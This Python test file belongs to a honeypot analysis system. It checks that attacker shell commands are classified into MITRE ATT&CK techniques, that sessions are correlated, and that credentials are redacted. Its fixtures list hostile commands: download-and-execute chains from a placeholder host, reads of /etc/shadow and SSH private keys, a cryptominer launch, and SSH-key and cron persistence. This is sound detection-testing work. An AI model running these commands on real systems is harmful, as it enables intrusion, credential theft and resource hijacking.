from __future__ import annotations

import asyncio
import base64
import copy
import json
import os
import sys
import tempfile
import urllib.error
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from production.workers.analysis_worker import (
    AnalysisWorker,
    build_threat_evidence_layers,
    deterministic_baseline_report,
)
from production.tools.build_external_seed_model import build_external_seed_model
from production.tools.build_session_ttp_knowledge_pack import build_knowledge_pack
from production.correlation.campaign_clustering import (
    _ordered_tactics as campaign_ordered_tactics,
    build_session_fingerprint,
    create_or_update_campaign,
)
from production.classification.classification_pipeline import NotebookParityClassifier, is_shell_noise, rule_based_ttp, split_compound_command
from production.classification.trust import (
    classification_audit_reason,
    is_trusted_classification_event,
)
from production.classification.detection_quality_audit import build_detection_quality_audit
from production.utils.config import ProductionConfig
from production.api.dashboard_api import _current_prediction_payload
from production.workers.enrichment_worker import EnrichmentWorker
from production.enrichment.enrichment_providers import CensysProvider, ShodanProvider, StaticProvider, merge_provider_results
from production.prediction.external_seed_health import build_external_seed_health, load_external_seed_health
from production.enrichment.ioc_extraction import extract_iocs_honeypot
from production.api.ingest_api import parse_events, validate_event
from production.api.monitor_web import (
    MonitorConfig,
    _render_enrichment_findings,
    _render_feedback_panel,
    _render_feedback_review_panel,
    _render_observable_sightings,
    _render_cross_session_hunting,
    _render_campaign_panel,
    _render_prediction_evidence,
    _render_prediction_panel,
    _render_report_panel,
    _report_recommendations,
    load_session_detail,
    record_analyst_feedback,
)
from production.classification.normalize_main_ttps import normalize_payload_main_ttps, normalize_storage
from production.correlation.observable_sightings import extract_event_observable_sightings
from production.classification.classification_evaluation import (
    auto_validate_cases,
    classification_metrics,
    collect_review_cases,
    import_review_labels,
)
from production.tools.coverage_audit import build_coverage_audit
from production.tools.prepare_classification_adjudication import prepare_queue
from production.tools.classification_consistency_benchmark import evaluate_review_artifact
from production.tools.primary_transition_evaluation import evaluate as evaluate_primary_transition
from production.workers.calibration_worker import build_calibration_run, write_calibration_output
from production.tools.feedback_review import build_feedback_review, filter_feedback_rows
from production.utils.feedback import (
    build_auto_evidence_feedback,
    feedback_weight_signal,
    normalize_feedback_payload,
)
from production.utils.serialization import session_to_payload
from production.prediction.prediction_backtest import (
    _tactic_steps as backtest_tactic_steps,
    backtest_sessions,
    evaluate_external_seed_shrinkage_grid,
    load_external_transition_model,
)
from production.prediction.weight_fitting import fit_weights_from_cases
from production.prediction.predictive_alerts import evaluate_predictive_alert
from production.prediction.behavior_regime import classify_behavior_regime
from production.prediction.realtime_prediction import (
    RealtimePredictionEngine,
    aggregate_technique_to_tactic,
    build_actor_fingerprint_transition_model,
    build_transition_model,
)
from production.utils.runtime_context import attach_runtime_context_to_payload
from production.correlation.session_evidence_graph import build_session_evidence_graph
from production.correlation.session_ttp_correlation import (
    apply_session_ttp_correlations,
    load_knowledge as load_session_ttp_correlation_knowledge,
    load_policy as load_session_ttp_correlation_policy,
    validate_policy_document as validate_session_ttp_correlation_policy,
)
from production.prediction.session_features import build_session_features
from production.workers.session_worker import SessionWorker, _safe_exception_text
from production.reporting.smb_decision import _features as smb_decision_features, build_smb_decision
from production.reporting.threat_hypothesis import build_v2_report
from production.storage import open_storage
from production.workers.threat_hunt_worker import (
    ThreatHuntWorker,
    _tactics as threat_hunt_tactics,
    enqueue_threat_hunts_for_session,
)
from production.policies.validate_prediction_policy import validate_policy_document
from production.policies.validate_classification_rules import validate_classification_rule_policy
from production.policies.validate_smb_policy import validate_action_policy, validate_asset_profile
from production.policies.validate_stix_bundle import run_external_stix_validation, validate_stix_bundle_document
from production.workers.webhook_dispatcher import WebhookDispatcher, target_hash
import production.enrichment.threat_feed_loader as feeds_module
from production.reporting.reporting_pipeline import (
    _build_analytical_confidence,
    _build_attack_timeline,
    _build_evidence_grounded_actor_profile,
    _build_falsification_conditions,
    _completed_actions_from_observed_ttps,
    _build_deterministic_executive_summary,
    _build_ioc_table,
    _build_trusted_recommendation_decision,
    _derive_primary_objective,
    _generate_dynamic_recommendations,
    _predict_next_action,
    _reject_ai_operator_actions,
    _validate_ai_grounding,
)
from production.workers.session_monitor import SessionState, _build_trusted_reporting_views
from production.reporting.artifacts import build_stix_bundle


def _config(tmp: str) -> ProductionConfig:
    keyring_path = Path(tmp) / "credential-hmac-keyring.json"
    keyring_path.write_text(
        json.dumps(
            {
                "schema_version": "credential_hmac_keyring.v1",
                "active_key_id": "unit-test-key",
                "keys": {
                    "unit-test-key": base64.b64encode(b"unit-test-key-material" * 2).decode(
                        "ascii"
                    )
                },
                "correlation_key_ids": [],
            },
            sort_keys=True,
        ),
        encoding="utf-8",
    )
    os.chmod(keyring_path, 0o600)
    webhook_key_path = Path(tmp) / "webhook-signing-key"
    webhook_key_path.write_bytes(b"fake-webhook-signing-key-material" * 2)
    os.chmod(webhook_key_path, 0o600)
    return ProductionConfig(
        database_url=f"sqlite:///{Path(tmp) / 'state.db'}",
        enable_feed_loading=False,
        enable_securebert=False,
        reports_dir=str(Path(tmp) / "reports"),
        worker_batch_size=100,
        analysis_batch_size=10,
        analysis_max_attempts=1,
        webhook_url="",
        webhook_signing_key_file=str(webhook_key_path),
        credential_hmac_keyring_file=str(keyring_path),
    )


def test_session_worker_exception_text_uses_central_redaction() -> None:
    message = _safe_exception_text(
        RuntimeError(
            "mongodb://unit-user:unit-password@example.invalid/honeypot"
            "?token=unit-token"
        )
    )

    assert message == "RuntimeError: operation_failed"
    assert "unit-user" not in message
    assert "unit-password" not in message
    assert "unit-token" not in message


def test_session_worker_redacts_derived_session_payload_and_preserves_valid_hmacs() -> None:
    worker = object.__new__(SessionWorker)
    worker.config = ProductionConfig()
    marker = "derived-session-boundary-probe"
    valid_digest = "hmac-sha256-v1:active-key:" + ("a" * 64)
    valid_alias = "hmac-sha256-v1:prior-key:" + ("b" * 64)
    forged_digest = "hmac-sha256-v1:active-key:" + ("z" * 64)
    state = SessionState(
        session_id="session-redaction",
        src_ip="203.0.113.10",
        start_time="2026-07-18T00:00:00Z",
    )
    state.client_version = f"password={marker}"
    state.login_username = f"Authorization: Bearer {marker}"
    state.login_password_hash = valid_digest
    state.login_password_hash_aliases = [valid_alias]
    state.credential_metadata = {
        "credential_observed": True,
        "raw_password_stored": False,
        "password_hash_present": True,
        "raw_events_sanitized": True,
        "hashing_enabled": True,
        "password_hash_alias_count": 1,
        "hash_algorithm": "hmac-sha256-v1",
        "active_key_id": "active-key",
        "correlation_key_ids": ["prior-key"],
        "password": marker,
    }
    state.raw_events = [
        {
            "eventid": "cowrie.login.success",
            "password": marker,
            "password_hash": valid_digest,
        },
        {
            "eventid": "cowrie.client.version",
            "password_hash": forged_digest,
            "version": f"token={marker}",
        },
    ]

    payload = worker._session_payload(state)
    encoded = json.dumps(payload, sort_keys=True)

    assert marker not in encoded
    assert payload["login_password_hash"] == valid_digest
    assert payload["login_password_hash_aliases"] == [valid_alias]
    assert payload["raw_events"][0]["password_hash"] == valid_digest
    assert payload["raw_events"][1]["password_hash"] == "[REDACTED]"
    assert payload["credential_metadata"]["raw_password_stored"] is False
    assert "password" not in payload["credential_metadata"]


def test_session_feature_boundary_redacts_object_and_mapping_inputs() -> None:
    marker = "session-feature-boundary-probe"
    current_marker = "current-event-boundary-probe"
    command = f"curl -u analyst:{marker} https://example.invalid/upload"
    current_command = (
        f"sshpass -p {current_marker} ssh analyst@example.invalid"
    )
    state = SessionState(
        session_id="feature-redaction",
        src_ip="203.0.113.11",
        start_time="2026-07-18T00:00:00Z",
    )
    state.commands = [command]
    state.raw_events = [
        {
            "eventid": "cowrie.command.input",
            "input": command,
            "password": marker,
        }
    ]

    for source in (state, session_to_payload(state)):
        features = build_session_features(
            source,
            current_event={
                "eventid": "cowrie.command.input",
                "timestamp": "2026-07-18T00:00:01Z",
                "input": current_command,
                "password": current_marker,
            },
        )
        encoded = json.dumps(features, sort_keys=True)

        assert marker not in encoded
        assert current_marker not in encoded
        assert "[REDACTED]" in features["commands"][0]
        assert "[REDACTED]" in features["command_timing_events"][-1]["command"]


def _demo_events() -> list[dict]:
    base = {
        "session": "sess-1",
        "src_ip": "8.8.8.8",
        "timestamp": "2026-05-12T00:00:00Z",
        "sensor": "demo-sensor",
    }
    return [
        {**base, "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh"},
        {**base, "eventid": "cowrie.login.success", "username": "root", "password": "secret-pass"},
        {**base, "eventid": "cowrie.command.input", "input": "whoami", "success": 1},
        {**base, "eventid": "cowrie.session.closed", "duration": 3.2},
    ]


def _demo_events_without_command_outcome() -> list[dict]:
    events = _demo_events()
    events[2] = {key: value for key, value in events[2].items() if key != "success"}
    return events


def _no_command_events() -> list[dict]:
    base = {
        "session": "sess-empty",
        "src_ip": "198.51.100.44",
        "timestamp": "2026-05-12T00:00:00Z",
        "sensor": "demo-sensor",
    }
    return [
        {**base, "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh"},
        {**base, "eventid": "cowrie.login.failed", "username": "root", "password": "bad-pass"},
        {**base, "eventid": "cowrie.session.closed", "duration": 1.1},
    ]


class FakeCoordinator:
    def __init__(self, base_url: str = "", model: str = "", max_tokens: int = 0) -> None:
        self.max_tokens = max_tokens

    async def analyze(self, ioc_bundle, tactic_summary, sessions_obj, **kwargs):
        return {
            "confidence": "Low - deterministic test report",
            "summary": "ok",
            "tactic_summary": tactic_summary,
            "raw_event_count": len(kwargs.get("raw_events", [])),
        }


class FailingCoordinator:
    def __init__(self, base_url: str = "", model: str = "", max_tokens: int = 0) -> None:
        pass

    async def analyze(self, *args, **kwargs):
        raise RuntimeError("vertex unavailable")


def test_ingest_validation_and_parsing() -> None:
    valid, error = validate_event({"eventid": "cowrie.command.input"})
    assert valid is True
    assert error == ""

    valid, error = validate_event({"input": "whoami"})
    assert valid is False
    assert "eventid" in error

    sensor_id, events = parse_events(
        {"sensor_id": "sensor-a", "events": [{"eventid": "cowrie.session.closed"}]},
        "default-sensor",
    )
    assert sensor_id == "sensor-a"
    assert len(events) == 1


def test_notebook_classifier_rule_merge_and_noise_filter() -> None:
    def wrong_high_bert(_cmd):
        return "T1087", 0.99

    classifier = NotebookParityClassifier(bert_fn=wrong_high_bert, high_confidence=0.55)
    result = classifier.classify("echo ssh-rsa AAA >> ~/.ssh/authorized_keys")
    assert result[0]["ttp"] == "T1098"
    assert result[0]["source"] == "rule_securebert_disagreement"
    assert result[0]["agreement_status"] == "technique_and_tactic_disagreement"
    assert is_trusted_classification_event(result[0]) is False
    assert result[0]["bert_ttp"] == "T1087"

    assert is_shell_noise("exit") is True
    assert is_shell_noise("whoami") is False
    assert rule_based_ttp("whoami")[0].tid == "T1033"


def test_compound_command_is_split_and_classified_in_order() -> None:
    command = "wget http://x/payload.sh -O /tmp/a && chmod +x /tmp/a && /tmp/a"
    fragments = split_compound_command(command)
    assert [fragment.text for fragment in fragments] == [
        "wget http://x/payload.sh -O /tmp/a",
        "chmod +x /tmp/a",
        "/tmp/a",
    ]
    assert [fragment.operator_before for fragment in fragments] == ["", "&&", "&&"]

    classifier = NotebookParityClassifier(bert_fn=lambda _cmd: (None, 0.0), high_confidence=0.55)
    events = classifier.classify(command)
    ttps = [event["ttp"] for event in events if event.get("ttp")]
    assert ttps == ["T1105", "T1222", "T1059"]
    assert [event["command"] for event in events if event.get("ttp")] == [
        "wget http://x/payload.sh -O /tmp/a",
        "chmod +x /tmp/a",
        "/tmp/a",
    ]
    assert all(event["original_command"] == command for event in events)
    assert [event["subcommand_index"] for event in events] == [0, 1, 2]
    assert events[1]["source"] == "rule"
    assert events[2]["source"] == "rule"

    audit_classifier = NotebookParityClassifier(
        bert_fn=lambda _cmd: (None, 0.0),
        high_confidence=0.55,
        rule_review_mode="all_enabled",
    )
    audit_ttps = [event["ttp"] for event in audit_classifier.classify(command) if event.get("ttp")]
    assert audit_ttps == ["T1105", "T1059", "T1222", "T1059"]
    assert not any(match.tid == "T1059" for match in rule_based_ttp("chmod +x /tmp/a"))


def test_demo_sensitive_key_and_chmod_use_reviewed_policy_rules() -> None:
    classifier = NotebookParityClassifier(
        bert_fn=lambda _cmd: (None, 0.0),
        high_confidence=0.55,
        rule_policy_path=str(ROOT / "configs" / "classification_rules.trusted.json"),
    )

    key_read = classifier.classify("cat /root/.ssh/id_rsa")
    chmod = classifier.classify("chmod +x /tmp/demo-payload.sh")

    assert key_read[0]["ttp"] == "T1552"
    assert key_read[0]["source"] == "rule"
    assert chmod[0]["ttp"] == "T1222"
    assert chmod[0]["source"] == "rule"


def test_honeypot_command_rule_policy_covers_common_attack_observables() -> None:
    classifier = NotebookParityClassifier(
        bert_fn=lambda _cmd: (None, 0.0),
        high_confidence=0.55,
        rule_policy_path=str(ROOT / "configs" / "classification_rules.trusted.json"),
    )

    cases = {
        "id": {"T1033"},
        "lscpu": {"T1082"},
        "ls -la /tmp": {"T1083"},
        "ifconfig": {"T1016"},
        "ss -tulpn": {"T1049"},
        "ps aux": {"T1057"},
        "busybox wget http://x/payload -O /tmp/a": {"T1105"},
        "chmod +x /tmp/a && /tmp/a": {"T1222", "T1059"},
        "history -c": {"T1070"},
        "echo x >> ~/.bashrc": {"T1546"},
        "useradd bot": {"T1136"},
        "sudo -l": {"T1548"},
        "base64 -d p.b64 > /tmp/a": {"T1140"},
        "sshpass -p x ssh root@192.0.2.2": {"T1021"},
        "xmrig -o stratum+tcp://pool": {"T1496"},
        "cat ~/.ssh/id_rsa": {"T1552"},
        "cat /etc/shadow": {"T1003"},
        "echo x > /etc/systemd/system/a.service && systemctl enable a.service": {"T1543"},
    }

    for command, expected_ttps in cases.items():
        events = classifier.classify(command)
        observed_ttps = {event["ttp"] for event in events if event.get("ttp")}
        assert expected_ttps <= observed_ttps, command


def test_detection_quality_audit_surfaces_review_and_unknown_gaps() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        policy_path = Path(tmp) / "classification_policy.json"
        events_path = Path(tmp) / "events.ndjson"
        policy_path.write_text(
            json.dumps(
                {
                    "schema_version": "classification_rule_policy.v1",
                    "policy_id": "unit-classification-policy",
                    "version": "1.0",
                    "policy": {
                        "enabled": True,
                        "rule_review_mode": "reviewed_only",
                        "rules": [
                            {
                                "rule_id": "unit-whoami",
                                "enabled": True,
                                "pattern": r"\bwhoami\b",
                                "ttp": "T1033",
                                "technique_name": "System Owner/User Discovery",
                                "confidence": 1.0,
                                "source_type": "human_curated_command_rule",
                                "evidence_type": "command_regex",
                                "references": [{"name": "MITRE ATT&CK T1033", "url": "https://attack.mitre.org/techniques/T1033/"}],
                                "provenance": {
                                    "method": "unit",
                                    "basis": ["unit reviewed rule"],
                                    "author": "unit",
                                    "reviewed": True,
                                    "reviewer": "unit",
                                    "last_reviewed": "2026-06-21",
                                    "review_status": "approved",
                                    "generated": False,
                                    "created": "2026-06-21",
                                    "version": "1.0",
                                },
                            },
                            {
                                "rule_id": "unit-passwd",
                                "enabled": True,
                                "pattern": r"\bcat\s+/etc/passwd\b",
                                "ttp": "T1003",
                                "technique_name": "OS Credential Dumping",
                                "confidence": 1.0,
                                "source_type": "human_curated_command_rule",
                                "evidence_type": "command_regex",
                                "references": [{"name": "MITRE ATT&CK T1003", "url": "https://attack.mitre.org/techniques/T1003/"}],
                                "provenance": {
                                    "method": "unit",
                                    "basis": ["unit unreviewed rule"],
                                    "author": "unit",
                                    "reviewed": False,
                                    "generated": False,
                                    "created": "2026-06-21",
                                    "version": "1.0",
                                },
                            },
                        ],
                    },
                }
            ),
            encoding="utf-8",
        )
        events_path.write_text(
            "\n".join(
                json.dumps(event)
                for event in [
                    {"eventid": "cowrie.command.input", "session": "s1", "input": "whoami"},
                    {"eventid": "cowrie.command.input", "session": "s1", "input": "file /sbin/init"},
                ]
            ),
            encoding="utf-8",
        )

        audit = build_detection_quality_audit(
            classification_policy_path=str(policy_path),
            events_path=str(events_path),
            limit=10,
        )
    assert audit["classification_policy"]["enabled_rules"] == 2
    assert audit["classification_policy"]["unique_main_ttps"] == 2
    assert audit["classification_policy"]["rule_review_mode"] == "reviewed_only"
    assert audit["classification_policy"]["reviewed_rules"] == 1
    assert audit["classification_policy"]["unreviewed_rules"] == 1
    assert audit["sample_command_classification"]["command_count"] == 2
    assert audit["sample_command_classification"]["classified_command_count"] == 1
    assert audit["sample_command_classification"]["unknown_or_unclassified_samples"][0]["command"] == "file /sbin/init"


def test_session_monitor_collapses_securebert_subtechnique_to_parent_ttp() -> None:
    from production.workers.session_monitor import SessionMonitor

    monitor = SessionMonitor(
        bert_fn=lambda _cmd: ("T1565.001", 0.93),
        classification_policy={"strategy": "securebert_only", "bert_min_confidence": 0.5},
    )
    events = monitor._classify_many_with_source("opaque malicious action")
    assert events[0]["ttp"] == "T1565"
    assert events[0]["source_ttp"] == "T1565.001"
    assert events[0]["source_subtechnique"] == "T1565.001"
    assert events[0]["technique_granularity"] == "subtechnique_collapsed"


def test_historical_main_ttp_normalization_preserves_source_subtechnique() -> None:
    payload = {
        "session_id": "historic-subtech",
        "ttps": ["T1565.001", "T1059"],
        "classification_events": [
            {"command": "truncate -s 0 /var/log/syslog", "ttp": "T1565.001", "tactic": "impact"},
        ],
        "session_ttp_correlations": [
            {"rule_id": "sigma-unit", "ttp": "T1027.001", "tactic": "defense-evasion"},
        ],
        "features": {
            "observed_ttps": ["T1565.001", "T1027.001"],
            "last_ttp": "T1027.001",
            "classification_events": [
                {"command": "truncate -s 0 /var/log/syslog", "ttp": "T1565.001", "tactic": "impact"},
            ],
        },
    }
    normalized, stats = normalize_payload_main_ttps(payload)
    assert normalized["ttps"] == ["T1565", "T1059"]
    assert normalized["classification_events"][0]["ttp"] == "T1565"
    assert normalized["classification_events"][0]["source_subtechnique"] == "T1565.001"
    assert normalized["session_ttp_correlations"][0]["ttp"] == "T1027"
    assert normalized["session_ttp_correlations"][0]["source_subtechnique"] == "T1027.001"
    assert normalized["features"]["observed_ttps"] == ["T1565", "T1027"]
    assert normalized["features"]["last_ttp"] == "T1027"
    assert stats["active_ttp_values_normalized"] >= 3


def test_main_ttp_normalization_storage_dry_run_and_apply() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.initialize()
        storage.save_session(
            {
                "session_id": "stored-subtech",
                "src_ip": "203.0.113.77",
                "start_time": "2026-05-24T00:00:00Z",
                "is_ended": True,
                "ttps": ["T1565.001"],
                "classification_events": [
                    {"command": "truncate", "ttp": "T1565.001", "tactic": "impact"},
                ],
            }
        )
        storage.save_prediction_snapshot(
            {
                "snapshot_id": "snap-subtech",
                "session_id": "stored-subtech",
                "src_ip": "203.0.113.77",
                "session_status": "active",
                "event_id": "event-1",
                "features_hash": "old-hash",
                "features": {
                    "observed_ttps": ["T1565.001"],
                    "last_ttp": "T1565.001",
                    "classification_events": [
                        {"command": "truncate", "ttp": "T1565.001", "tactic": "impact"},
                    ],
                },
            }
        )

        dry = normalize_storage(database_url=cfg.database_url, apply=False)
        assert dry["total_rows_changed"] == 2

        applied = normalize_storage(database_url=cfg.database_url, apply=True)
        assert applied["total_rows_changed"] == 2

        session_payload = json.loads(storage.list_rows("sessions", limit=1)[0]["payload_json"])
        assert session_payload["ttps"] == ["T1565"]
        assert session_payload["classification_events"][0]["source_subtechnique"] == "T1565.001"

        snapshot = storage.get_latest_prediction_snapshot("stored-subtech")["payload"]
        assert snapshot["features_hash"] == "old-hash"
        assert snapshot["features"]["observed_ttps"] == ["T1565"]
        assert snapshot["features"]["classification_events"][0]["source_subtechnique"] == "T1565.001"

        second = normalize_storage(database_url=cfg.database_url, apply=False)
        assert second["total_rows_changed"] == 0


def test_main_ttp_normalization_uses_backend_neutral_storage_methods() -> None:
    class FakeStorage:
        def __init__(self) -> None:
            self.saved_sessions = []
            self.saved_snapshots = []

        def list_rows(self, table, limit=100):
            assert limit == 50
            if table == "sessions":
                return [
                    {
                        "session_id": "mongo-session",
                        "src_ip": "8.8.8.8",
                        "ended": True,
                        "session_source": "production_live",
                        "payload": None,
                        "payload_json": json.dumps(
                            {
                                "session_id": "mongo-session",
                                "src_ip": "8.8.8.8",
                                "is_ended": True,
                                "session_source": "production_live",
                                "ttps": ["T1565.001"],
                            }
                        ),
                    }
                ]
            if table == "prediction_snapshots":
                return [
                    {
                        "snapshot_id": "mongo-snapshot",
                        "session_id": "mongo-session",
                        "src_ip": "8.8.8.8",
                        "session_status": "closed",
                        "event_id": "mongo-event",
                        "features_hash": "preserved-hash",
                        "payload": {
                            "snapshot_id": "mongo-snapshot",
                            "session_id": "mongo-session",
                            "src_ip": "8.8.8.8",
                            "session_status": "closed",
                            "event_id": "mongo-event",
                            "features_hash": "preserved-hash",
                            "features": {
                                "observed_ttps": ["T1565.001"],
                                "last_ttp": "T1565.001",
                            },
                        },
                    }
                ]
            raise AssertionError(f"unexpected table: {table}")

        def save_session(self, payload):
            self.saved_sessions.append(copy.deepcopy(payload))

        def save_prediction_snapshot(self, payload):
            self.saved_snapshots.append(copy.deepcopy(payload))

    storage = FakeStorage()
    result = normalize_storage(
        database_url=(
            "mongodb://unit-user:unit-password@example.invalid/honeypot"
            "?authSource=admin&token=unit-secret"
        ),
        limit=50,
        apply=True,
        storage=storage,
    )

    assert result["database"] == {
        "backend": "mongodb",
        "endpoint": "example.invalid",
        "database": "honeypot",
    }
    assert result["database_url"] == "mongodb://example.invalid/honeypot"
    assert "unit-user" not in json.dumps(result)
    assert "unit-password" not in json.dumps(result)
    assert "unit-secret" not in json.dumps(result)
    assert result["total_rows_scanned"] == 2
    assert result["total_rows_changed"] == 2
    assert storage.saved_sessions[0]["ttps"] == ["T1565"]
    assert storage.saved_snapshots[0]["snapshot_id"] == "mongo-snapshot"
    assert storage.saved_snapshots[0]["features_hash"] == "preserved-hash"
    assert storage.saved_snapshots[0]["features"]["observed_ttps"] == ["T1565"]
    assert storage.saved_snapshots[0]["features"]["last_ttp"] == "T1565"


def test_session_ttp_correlation_policy_validates_and_correlates_session_patterns() -> None:
    policy = load_session_ttp_correlation_policy(Path("configs") / "session_ttp_correlation.trusted.json")
    assert validate_session_ttp_correlation_policy(policy) == []

    session_payload = {
        "session_id": "correlate-1",
        "src_ip": "203.0.113.40",
        "commands": [
            "wget http://x/payload.sh -O /tmp/a && chmod +x /tmp/a && /tmp/a",
            "history -c",
        ],
        "classification_events": [
            {"command": "wget http://x/payload.sh -O /tmp/a", "ttp": "T1105", "tactic": "command-and-control", "source": "rule", "confidence": 1.0},
            {"command": "chmod +x /tmp/a", "ttp": "T1059", "tactic": "execution", "source": "both", "confidence": 1.0},
            {"command": "/tmp/a", "ttp": "T1059", "tactic": "execution", "source": "rule", "confidence": 1.0},
            {"command": "history -c", "ttp": "T1070", "tactic": "defense-evasion", "source": "both", "confidence": 1.0},
        ],
        "raw_events": [
            {"eventid": "cowrie.session.file_download", "outfile": "var/lib/cowrie/downloads/hash", "shasum": "abc"},
        ],
    }

    updated = apply_session_ttp_correlations(session_payload, policy)
    correlations = updated["session_ttp_correlations"]
    rule_ids = {item["rule_id"] for item in correlations}
    assert "cowrie-file-transfer-correlates-t1105" in rule_ids
    assert "download-then-execute-chain-correlates-t1059" in rule_ids
    assert "history-or-log-cleanup-correlates-t1070" in rule_ids
    assert all(item["references"] for item in correlations)
    assert all((item["provenance"] or {}).get("basis") for item in correlations)
    assert all(item["apply_to_prediction"] is False for item in correlations)

    features = build_session_features(updated)
    assert features["correlated_ttps"] == []
    assert "command-and-control" in features["observed_tactics"]
    assert updated["session_evidence_graph_summary"]["command_count"] == 2
    assert updated["session_ttp_correlation_summary"]["manual_rule_count"] >= 1


def test_session_ttp_correlation_covers_common_honeypot_attack_chains() -> None:
    policy = load_session_ttp_correlation_policy(Path("configs") / "session_ttp_correlation.trusted.json")
    assert validate_session_ttp_correlation_policy(policy) == []

    session_payload = {
        "session_id": "correlate-honeypot-chain",
        "src_ip": "198.51.100.77",
        "commands": [
            "whoami",
            "uname -a",
            "busybox wget http://x/payload -O /tmp/a",
            "chmod +x /tmp/a",
            "/tmp/a",
            "base64 -d p.b64 > /tmp/decoded",
            "./decoded",
            "echo x >> ~/.bashrc",
            "sudo -l",
            "sshpass -p x ssh root@192.0.2.2",
            "xmrig -o stratum+tcp://pool",
        ],
        "classification_events": [
            {"command": "whoami", "ttp": "T1033", "tactic": "discovery", "source": "rule", "confidence": 1.0},
            {"command": "uname -a", "ttp": "T1082", "tactic": "discovery", "source": "rule", "confidence": 1.0},
            {"command": "busybox wget http://x/payload -O /tmp/a", "ttp": "T1105", "tactic": "command-and-control", "source": "rule", "confidence": 1.0},
            {"command": "chmod +x /tmp/a", "ttp": "T1222", "tactic": "defense-evasion", "source": "rule", "confidence": 1.0},
            {"command": "/tmp/a", "ttp": "T1059", "tactic": "execution", "source": "rule", "confidence": 1.0},
            {"command": "base64 -d p.b64 > /tmp/decoded", "ttp": "T1140", "tactic": "defense-evasion", "source": "rule", "confidence": 1.0},
            {"command": "./decoded", "ttp": "T1059", "tactic": "execution", "source": "rule", "confidence": 1.0},
            {"command": "echo x >> ~/.bashrc", "ttp": "T1546", "tactic": "persistence", "source": "rule", "confidence": 1.0},
            {"command": "sudo -l", "ttp": "T1548", "tactic": "privilege-escalation", "source": "rule", "confidence": 1.0},
            {"command": "sshpass -p x ssh root@192.0.2.2", "ttp": "T1021", "tactic": "lateral-movement", "source": "rule", "confidence": 1.0},
            {"command": "xmrig -o stratum+tcp://pool", "ttp": "T1496", "tactic": "impact", "source": "rule", "confidence": 1.0},
        ],
        "raw_events": [
            {"eventid": "cowrie.session.file_download", "outfile": "var/lib/cowrie/downloads/hash", "shasum": "abc"},
        ],
    }

    updated = apply_session_ttp_correlations(session_payload, policy)
    correlations = updated["session_ttp_correlations"]
    rule_ids = {item["rule_id"] for item in correlations}

    assert "recon-then-payload-chain-correlates-t1105" in rule_ids
    assert "download-then-execute-chain-correlates-t1059" in rule_ids
    assert "decode-then-execute-chain-correlates-t1140" in rule_ids
    assert "shell-startup-persistence-correlates-t1546" in rule_ids
    assert "remote-service-attempt-correlates-t1021" in rule_ids
    assert "privilege-escalation-attempt-correlates-t1548" in rule_ids
    assert "botnet-miner-staging-correlates-t1496" in rule_ids

    miner_correlation = next(item for item in correlations if item["rule_id"] == "botnet-miner-staging-correlates-t1496")
    assert miner_correlation["apply_to_prediction"] is False

    features = build_session_features(updated)
    assert features["correlated_ttps"] == []


def test_session_ttp_sequence_correlations_require_the_documented_order() -> None:
    policy = load_session_ttp_correlation_policy(Path("configs") / "session_ttp_correlation.trusted.json")
    reverse_order_payload = {
        "session_id": "correlate-reverse-order",
        "commands": ["./decoded", "base64 -d p.b64 > /tmp/decoded"],
        "classification_events": [
            {
                "command": "./decoded",
                "ttp": "T1059",
                "tactic": "execution",
                "source": "rule",
                "confidence": 1.0,
            },
            {
                "command": "base64 -d p.b64 > /tmp/decoded",
                "ttp": "T1140",
                "tactic": "defense-evasion",
                "source": "rule",
                "confidence": 1.0,
            },
        ],
        "raw_events": [],
    }
    reverse = apply_session_ttp_correlations(reverse_order_payload, policy)
    reverse_ids = {item["rule_id"] for item in reverse["session_ttp_correlations"]}
    assert "decode-then-execute-chain-correlates-t1140" not in reverse_ids

    forward_order_payload = {
        **reverse_order_payload,
        "session_id": "correlate-forward-order",
        "commands": list(reversed(reverse_order_payload["commands"])),
        "classification_events": list(reversed(reverse_order_payload["classification_events"])),
    }
    forward = apply_session_ttp_correlations(forward_order_payload, policy)
    forward_ids = {item["rule_id"] for item in forward["session_ttp_correlations"]}
    assert "decode-then-execute-chain-correlates-t1140" in forward_ids

    candidate_ids = {
        item["rule_id"]
        for item in policy["policy"]["rules"]
        if item["evidence_type"] == "session_correlated_candidate"
    }
    assert {
        "linux-shadow-read-correlates-t1003-008",
        "ssh-private-key-read-correlates-t1552-004",
        "history-or-log-cleanup-correlates-t1070",
        "authorized-keys-modification-correlates-t1098",
    }.issubset(candidate_ids)


def test_session_persistence_correlations_require_modification_not_path_reference() -> None:
    policy = load_session_ttp_correlation_policy(Path("configs") / "session_ttp_correlation.trusted.json")
    read_only = {
        "session_id": "correlation-read-only-paths",
        "commands": ["crontab -l", "cat ~/.bashrc", "ls ~/.ssh/authorized_keys"],
        "classification_events": [
            {"command": "crontab -l", "ttp": "T1053", "tactic": "persistence", "source": "rule", "confidence": 1.0},
            {"command": "cat ~/.bashrc", "ttp": "T1546", "tactic": "persistence", "source": "rule", "confidence": 1.0},
            {"command": "ls ~/.ssh/authorized_keys", "ttp": "T1098", "tactic": "persistence", "source": "rule", "confidence": 1.0},
        ],
        "raw_events": [],
    }
    read_only_ids = {
        item["rule_id"]
        for item in apply_session_ttp_correlations(read_only, policy)["session_ttp_correlations"]
    }
    assert "cron-modification-correlates-t1053" not in read_only_ids
    assert "shell-startup-persistence-correlates-t1546" not in read_only_ids
    assert "authorized-keys-modification-correlates-t1098" not in read_only_ids

    modifications = {
        "session_id": "correlation-observed-modifications",
        "commands": [
            "echo '* * * * * /tmp/a' | crontab -",
            "echo x >> ~/.bashrc",
            "echo 'ssh-rsa AAAATEST' >> ~/.ssh/authorized_keys",
        ],
        "classification_events": [
            {"command": "echo '* * * * * /tmp/a' | crontab -", "ttp": "T1053", "tactic": "persistence", "source": "rule", "confidence": 1.0},
            {"command": "echo x >> ~/.bashrc", "ttp": "T1546", "tactic": "persistence", "source": "rule", "confidence": 1.0},
            {"command": "echo 'ssh-rsa AAAATEST' >> ~/.ssh/authorized_keys", "ttp": "T1098", "tactic": "persistence", "source": "rule", "confidence": 1.0},
        ],
        "raw_events": [],
    }
    modification_correlations = {
        item["rule_id"]: item
        for item in apply_session_ttp_correlations(modifications, policy)["session_ttp_correlations"]
    }
    assert "cron-modification-correlates-t1053" in modification_correlations
